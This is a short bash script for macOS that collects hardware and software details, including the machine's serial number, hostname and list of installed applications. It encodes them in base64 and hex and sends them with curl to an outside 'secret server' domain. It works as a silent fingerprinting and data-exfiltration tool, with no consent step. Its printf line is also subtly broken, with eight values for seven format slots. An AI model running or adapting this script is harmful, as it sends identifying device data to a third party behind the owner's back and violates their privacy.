#!/bin/bash

# author: https://github.com/AnotherGithubDude, 2023
# tested with: GNU bash, Version 5.2.12

# Create variables for hardware components
memory_size=$(sysctl -a | grep hw.memsize | cut -d: -f2) 
processor_type=$(sysctl -a | grep machdep.cpu.brand_string | cut -d: -f2)
storage_size=$(diskutil info / | grep "Total Size" | cut -d: -f2)

# Create variables for software components
osx_version=$(sw_vers -productVersion)
kernel_version=$(uname -r)
hostname=$(hostname)
serial_number=$(ioreg -c IOPlatformExpertDevice | awk -F\" '/IOPlatformSerialNumber/{print $(NF-1)}')
installed_applications=$(find /Applications/*.app -maxdepth 0 -print)

# Encode the collected info into base64
base64_info=$(printf "%s %s %s %s %s %s %s" "$memory_size" "$processor_type" "$storage_size" "$osx_version" "$kernel_version" "$hostname" "$serial_number" "$installed_applications" | base64)

# URL encode the data
urlencoded_data=$(printf $base64_info | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g')

# Send encoded data to secure web server
curl https://www.anothergithubdudessecretserver.com/collectdata.jsp --data "data=$urlencoded_data"
